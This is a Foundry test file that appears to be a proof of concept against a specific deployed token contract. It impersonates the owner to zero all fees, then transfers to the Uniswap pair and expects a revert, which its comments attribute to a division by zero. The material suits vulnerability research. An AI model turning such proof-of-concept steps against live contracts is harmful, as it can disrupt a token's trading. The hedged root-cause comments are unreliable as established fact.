// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IKARMA {
    function owner() external view returns (address);
    function setBuyFeePercentages(uint256, uint256, uint256, uint256) external;
    function setSellFeePercentages(uint256, uint256, uint256, uint256) external;
    function enableTrading() external;
    function transfer(address, uint256) external returns (bool);
    function uniswapV2Pair() external view returns (address);
    function walletToWalletTransferWithoutFee() external view returns (bool);
    function enableWalletToWalletTransferWithoutFee(bool) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x8F9bA08Cbf014aB233A33067B21bEdF3876c6605;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed beyond what's in the test template
        // We'll use vm.prank to impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner address
        address owner = IKARMA(TARGET).owner();

        // Step 2: Impersonate owner and set all fees to zero
        vm.startPrank(owner);
        IKARMA(TARGET).setBuyFeePercentages(0, 0, 0, 0);
        IKARMA(TARGET).setSellFeePercentages(0, 0, 0, 0);

        // Ensure trading is enabled (it might already be)
        try IKARMA(TARGET).enableTrading() {} catch {}
        vm.stopPrank();

        // Step 3: Get some tokens to transfer
        // First, we need to get tokens from somewhere - the owner has all tokens initially
        // Let's impersonate owner again to transfer some tokens to attacker
        vm.prank(owner);
        IKARMA(TARGET).transfer(attacker, 1000 * 10**9);

        // Step 4: Trigger the vulnerable transfer
        // We need to trigger a transfer that will calculate fees
        // Since walletToWalletTransferWithoutFee is true by default, we need to either:
        // 1. Disable it, or 2. Transfer to/from the uniswap pair

        // Let's get the uniswap pair address
        address uniswapPair = IKARMA(TARGET).uniswapV2Pair();

        // Step 5: Try to transfer to the pair (this should trigger sell fee calculation)
        // This should cause the division by zero in _takeLiquidity
        vm.expectRevert();
        IKARMA(TARGET).transfer(uniswapPair, 100 * 10**9);
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
